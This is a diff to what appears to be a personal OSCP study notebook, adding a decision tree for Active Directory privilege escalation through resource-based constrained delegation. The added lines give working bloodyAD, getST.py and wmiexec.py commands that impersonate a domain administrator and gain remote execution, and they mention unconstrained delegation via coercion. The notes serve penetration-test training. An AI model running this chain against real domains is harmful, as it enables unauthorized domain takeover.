@@ -90,6 +90,19 @@ WriteDACL on an object:
 WriteOwner on an object:
   → Set-DomainObjectOwner -Credential $Cred -Identity $BoxIP -OwnerIdentity $Username
   → Then WriteDACL → add GenericAll → proceed
+
+GenericAll or another write permission on a computer object:
+  → Is a controlled computer or service account available?
+       YES → Recover or obtain its machine NT hash
+            → bloodyAD -u $Username -p $Password -d $Domain --host $BoxIP add rbcd $TargetComputer $MachineAccount
+            → getST.py -spn "cifs/$FQDN" -impersonate $AdminUser -dc-ip $BoxIP "$Domain/$MachineAccount" -hashes ":$NThash"
+            → KRB5CCNAME=$BoxDir/loot/Administrator.ccache wmiexec.py -k -no-pass $FQDN
+       NO → Check whether the domain permits adding a controlled computer account
+            → Otherwise return to BloodHound for another path
+
+Computer has TrustedForDelegation enabled:
+  → Prefer RBCD when a writable target ACL and controlled machine account exist
+  → Otherwise assess unconstrained delegation with an authorized coercion and ticket-capture path
 ```
 
 Full reference: [[22. Active Directory Introduction and Enumeration|AD.9.3 rights table]], [[22. Active Directory Introduction and Enumeration|AD.10 full chain]]
@@ -634,3 +647,4 @@ This page turns one repeatable part of an authorized assessment into a checklist
 ## Demonstrated in box write-ups
 
 - [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
+- [[OSCP/BOXES/WRITE UPS/AD/RockyColt|RockyColt]] -- demonstrates choosing RBCD after GenericAll and delegation findings
